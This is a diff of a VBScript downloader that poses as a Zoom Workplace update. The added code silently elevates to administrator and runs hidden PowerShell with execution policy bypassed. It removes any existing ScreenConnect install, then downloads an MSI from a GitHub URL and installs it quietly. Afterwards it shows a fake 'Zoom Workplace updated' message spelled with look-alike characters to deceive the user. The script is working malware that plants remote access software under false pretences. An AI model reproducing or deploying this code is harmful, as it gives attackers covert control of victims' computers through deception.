@@ -1,5 +1,4 @@
 Option Explicit
-
 Dim oShell, oFSO, sTempFolder, sMsiURL, sMsiFile
 Dim nResult, sMessage
 
@@ -8,34 +7,35 @@ Set oFSO = CreateObject("Scripting.FileSystemObject")
 sTempFolder = oShell.ExpandEnvironmentStrings("%TEMP%")
 sMsiFile = oFSO.BuildPath(sTempFolder, "sdc.msi")
 
-sMsiURL = "https://seworks.mhawkster01.info/sdc"
+sMsiURL = "https://raw.githubusercontent.com/amuell29/cm/refs/heads/main/sdc"
 
 If Not IsAdmin() Then
-    Elevate()
+    ElevateSilent()
     WScript.Quit 0
 End If
 
-Call UninstallScreenConnect()
-
-If Not DownloadWithCurl(sMsiURL, sMsiFile) Then
-    MsgBox "Download failed. Please check your internet connection.", vbCritical, "Download Error"
-    WScript.Quit 1
-End If
-
-nResult = InstallMSI(sMsiFile)
-
-If oFSO.FileExists(sMsiFile) Then oFSO.DeleteFile(sMsiFile)
-
-If nResult = 0 Then
-    MsgBox "SDC has been installed successfully!", vbInformation, "Installation Complete"
-Else
-    MsgBox "Installation failed with code: " & nResult & vbCrLf & _
-           "Please check the installation and try again.", vbCritical, "Installation Failed"
-End If
-
-WScript.Quit nResult
+Dim sScript
+sScript = "& {" & vbCrLf & _
+          "    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf & _
+          "    $msiFile = '" & sMsiFile & "'" & vbCrLf & _
+          "    $msiUrl = '" & sMsiURL & "'" & vbCrLf & _
+          "    Write-Host 'Checking for existing sdc...'" & vbCrLf & _
+          "    $existing = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like '*screenconnect*' }" & vbCrLf & _
+          "    if ($existing) { $existing | ForEach-Object { $_.Uninstall() }; Start-Sleep -Seconds 3 }" & vbCrLf & _
+          "    Write-Host 'Downloading sdc...'" & vbCrLf & _
+          "    Invoke-WebRequest -Uri $msiUrl -OutFile $msiFile -UseBasicParsing" & vbCrLf & _
+          "    Write-Host 'Installing sdc...'" & vbCrLf & _
+          "    Start-Process msiexec -ArgumentList '/i', $msiFile, '/qn', '/norestart' -Wait" & vbCrLf & _
+          "    Remove-Item $msiFile -ErrorAction SilentlyContinue" & vbCrLf & _
+          "    Write-Host 'Installation complete'" & vbCrLf & _
+          "}"
 
 
+oShell.Run "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & sScript & """", 0, True
+
+MsgBox "Zοоm Wоrkрӏасе has been updated successfully!", vbInformation, "Installation Complete"
+
+WScript.Quit 0
 
 Function IsAdmin()
     On Error Resume Next
@@ -49,42 +49,8 @@ Function IsAdmin()
     On Error GoTo 0
 End Function
 
-Sub Elevate()
+Sub ElevateSilent()
     Dim oShellApp
     Set oShellApp = CreateObject("Shell.Application")
-    oShellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
+    oShellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0
 End Sub
-
-Sub UninstallScreenConnect()
-    On Error Resume Next
-    Dim oWMI, oProducts, oProduct
-    
-    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set oProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%ScreenConnect%'")
-    
-    For Each oProduct In oProducts
-        oProduct.Uninstall()
-    Next
-    
-    On Error GoTo 0
-    Set oWMI = Nothing
-    Set oProducts = Nothing
-End Sub
-
-Function DownloadWithCurl(sURL, sLocalPath)
-    Dim oExec, nExitCode
-
-    Set oExec = oShell.Exec("curl -L -s -o """ & sLocalPath & """ """ & sURL & """")
-    oExec.StdOut.ReadAll  
-    nExitCode = oExec.ExitCode
-    
-    DownloadWithCurl = (nExitCode = 0 And oFSO.FileExists(sLocalPath))
-End Function
-
-Function InstallMSI(sMSIFile)
-    Dim oExec
-    
-    Set oExec = oShell.Exec("msiexec /i """ & sMSIFile & """ /qn /norestart")
-    oExec.StdOut.ReadAll
-    InstallMSI = oExec.ExitCode
-End Function
